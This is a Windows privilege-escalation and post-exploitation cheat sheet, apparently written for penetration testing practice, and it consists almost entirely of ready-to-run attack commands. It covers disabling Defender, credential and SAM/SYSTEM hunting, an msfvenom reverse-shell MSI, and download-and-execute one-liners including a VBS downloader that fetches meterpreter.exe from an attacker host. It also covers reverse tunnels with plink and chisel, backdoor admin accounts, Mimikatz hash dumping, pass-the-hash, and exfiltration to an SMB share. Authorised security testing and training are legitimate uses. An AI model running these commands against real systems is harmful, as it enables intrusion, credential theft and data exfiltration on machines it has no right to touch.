# Quick Enum    
## Command line
    systeminfo 
    whoami /priv
    ipconfig /all     
    net users   
    qwinsta    
    net localgroup    
    dir /r    
    tree /a /f  
    
    netstat /anto   
    for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.     
    route print 
    arp -a   
    netsh firewall show state 
    netsh firewall show config
    C:\Windows\System32\drivers\etc\host        Windows DNS entries 
    
## Powershell
    Get-ExecutionPolicy    
    Set-ExecutionPolicy Unrestricted   
    Set-MpPreference -DisableRealtimeMonitoring $true   
    
## Scripts
[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)   

## Checklists    
[HackTricks Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

____   

# Manual Enum 
https://lolbas-project.github.io/#   
    
## Service Exploits 
    tasklist /svc 
    sc query 
    net start/stop service
### Unquoted Service Paths
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """   
### Weak Registry Permissions
### Insecure Service Executables 
    accesschk.exe -uwcqv "Everyone" *
    accesschk.exe -uwcqv "Authenticated Users" *
    accesschk.exe -uwcqv "Users" *
### Scheduled Tasks
    schtasks /query /fo LIST 2>nul | findstr TaskName
### DLL Search Order Hijacking

## Registry Exploits
### Autoruns
### AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi -o reverse.msi /quiet /i reverse.msi
## Passwords
    findstr /si password *.xml *.ini *.txt *.config 2>nul
### Saved creds
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
    cmdkey /list
    runas /savecred /user:[user name] C:\PrivEsc\reverse.exe
### Creds in Registry 
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
### SAM and SYSTEM Files
    %SYSTEMROOT%\repair\SAM
    %SYSTEMROOT%\System32\config\RegBack\SAM
    %SYSTEMROOT%\System32\config\SAM
    %SYSTEMROOT%\repair\system
    %SYSTEMROOT%\System32\config\SYSTEM
    %SYSTEMROOT%\System32\config\RegBack\system
## Kernel exploits   
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   
### Tools
https://github.com/bitsadmin/wesng   
https://github.com/rasta-mouse/Watson   
### Precompiled Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits   

____   

# File Transfer     
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
    copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe

    certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
    
## Powershell
    powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
    powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
    powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Windows\Temp\out  
    
    IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

## VBS 
    echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"

## XM File Creation (Using copy and paste)
    PS C:\> $console = [XML] @"
    <XML CODE CODE HERE>
    "@
    /# write the xml to file:
    PS C:\> $console.save("C:\users\burmat\documents\console.xml")
 ## Windows 10 - curl
    curl http://server/file -o file
    curl http://server/file.bat | cmd
 ____   
 # Port Forwarding
 Expose internal services, usually hidden due to firewall rules. 
     netsh firewall show config 
     
## SSH (Window 10 and newer)
     [from target box to expose SMB ]
     ssh -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 
## Plink.exe
     [upload plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)  
     plink.exe -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS   <-note entering in your password on a victim box is a bad idea
     
     [generate ssh keys on kali, convert to putty keys and then upload with plink.exe to target ] 
     sudo apt install putty-tools 
     puttygen KEYFILE -o OUTPUT_KEY.ppk 
     cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N 
## Chisel 
Good for getting through firewalls, need correct copies of binaries on both target / attack box  
Need to change /etc/proxychains4.conf socks4 to socks5 on attack box 
### Chisel socks Reverse Proxy 
    attack    ./chisel server -p LISTEN_PORT --reverse &  
    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks & 
### Chisel socks Forward Proxy 
    target    ./chisel server -p LISTEN_PORT --socks5  
    attack    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
### Chisel Remote Port Forward 
    attack    ./chisel server -p LISTEN_PORT --reverse &  
    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT & 
### Chisel Local Port Forward 
    target    ./chisel server -p LISTEN_PORT 
    attack    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT 
 ____
 # Persistence
     net user USERNAME PASSWORD /add
     net localgroup Administrators USERNAME /add
     net localgroup "Remote Management Users" USERNAME /add  
     pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP  
     xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share   
     \\tsclient\share\mimikatz\x64\mimikatz.exe 
 ____ 
 # Post Exploitation / Exfiltration 
 [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
 
     python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS 
     net use \\IP\share /USER:USER PASS  
     copy FILE \\IP\share\FILE  
 ## Mimikatz
     privilege::debug 
     token::elevate 
     lsadump::sam  
     *then crack hashes or use pass the hash to login* [Online hash cracker](https://crackstation.net/) 
 ## AV Evasion 
     reg.exe save HKLM\SAM sam.bak 
     reg.exe save HKLM\SYSTEM system.bak 
     *transfer files to attack box then dump* 
     python3 /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL 
     
 ____
 
# Resources
## Cheat Sheets and Guides 
https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts  
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ 
## Learn More
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/      
https://github.com/frizb/Windows-Privilege-Escalation
  
